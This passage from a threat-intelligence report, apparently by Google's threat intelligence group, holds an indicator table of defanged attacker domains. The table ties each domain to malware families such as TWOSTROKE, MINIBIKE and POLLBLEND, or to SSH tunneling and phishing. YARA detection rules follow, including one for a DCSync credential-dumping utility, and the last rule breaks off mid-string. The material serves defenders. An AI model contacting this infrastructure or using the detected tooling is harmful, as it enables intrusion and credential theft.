style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airseatsregistering.qatarcentral.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DEEPROOT</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">airtravellog[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">automationagencybusiness.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">automationagencybusiness[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">browsercheckap.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">codesparkle.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">connect-acc-492.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">connect-acl-492.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">customerlistchange.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LIGHTRAIL</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">developercodepro.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">developercodevista.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">dreamtiniventures.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">fdtsprobusinesssolutions.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">forcecodestore[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hserbhh43.westus3.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">infrasync-ac372.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-check-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-check-status675.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-status45.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">intra-az-status795.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">masterflexiblecloud.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mso-internal-log65.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mso-internal-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mso-intranet-logs.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mydocs.qatarcentral.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing domain for lateral movement</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nx425-win4945.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nx4542-win4957.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxlog-crash-1567.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxlog-win-1567.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxversion-win-1567.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">nxversion-win32-1127.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">overqatfa.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">queuetestapplication.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skychain13424.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skychain41334.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skychains42745.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">skyticketgrant.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">MINIBIKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">snare-core.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">storageboxcloud.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">storagewiz.co.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">swiftcode.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">swifttiniventures.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">terratechworld.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thecloudappbox.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thestorageboxcloud.northeurope.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thetacticstore[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thevaultapp.westus3.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">thevaultspace.eastus.cloudapp.azure[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">tini-ventures[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vcphone-ms.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vcs-news[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vm-ticket-svc.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vm-tools-svc.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vmware-health-ms.azurewebsites[.]net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">POLLBLEND</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Rules</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>import \"pe\"\n\nrule M_APT_Utility_DCSYNCER_SLICK_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\t\tmd5 = \"10f16991665df69d1ccd5187e027cf3d\"\n\tstrings:\n\t\t$ = { 48 89 84 24 ?? 01 00 00 C7 84 24 ?? 01 00 00 30 80 28 00 C7 84 24 ?? 01 00 00 E8 03 00 00 48 C7 84 24 ?? 01 00 00 00 00 A0 00 BA ?? 00 00 00 8D 4A ?? FF 15 ?? ?? 01 00 48 89 84 24 ?? 01 00 00 C7 00 01 00 00 00 48 8B 84 24 ?? 01 00 00 44 89 ?? 04 48 8B 84 24 ?? 01 00 00 C7 40 08 ?? 00 00 00 41 8B ?? }\n\t\t$ = \"\\\\LOG.txt\" ascii wide\n\t\t$ = \"%ws_%d:%d:\" ascii wide fullword\n\t\t$ = \"%ws:%d:\" ascii wide fullword\n\t\t$ = \"::::\" ascii wide fullword\n\t\t$ = \"%ws_%d:%d::\" ascii wide fullword\n\t\t$ = \"%ws:%d::\" ascii wide fullword\n\tcondition:\n\t\tpe.is_pe and all of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>import \"pe\"\n\nrule M_APT_Utility_CRASHPAD_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\t\tmd5 = \"b2bd275f97cb95c7399065b57f90bb6c\"\n\tstrings:\n\t\t$ = \"[-] Loo ror: %u\" ascii fullword\n\t\t$ = \"[-] Adj r: 